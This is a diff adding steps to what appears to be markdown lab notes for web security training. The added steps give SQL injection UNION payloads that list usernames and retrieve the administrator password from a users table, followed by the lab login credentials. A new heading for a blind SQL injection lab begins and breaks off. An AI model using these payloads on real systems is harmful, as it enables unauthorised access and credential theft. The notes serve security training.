@@ -212,4 +212,22 @@
     [+] Amount of columns: 2 
     ```
 
-2. 
+2. Listing `usernames`:
+
+    ```sql
+    ' union select null, username from users-- -
+    ```
+
+3. Retrieving `password` for `administrator`:
+
+    ```sql
+    ' union select null, password from users where username='administrator'-- -
+    ```
+
+4. Logging in with credentials:
+    - administrator
+    - iyss16ett8k3ts7ugtut
+
+# Lab: Blind SQL injection with conditional responses
+
+1. 
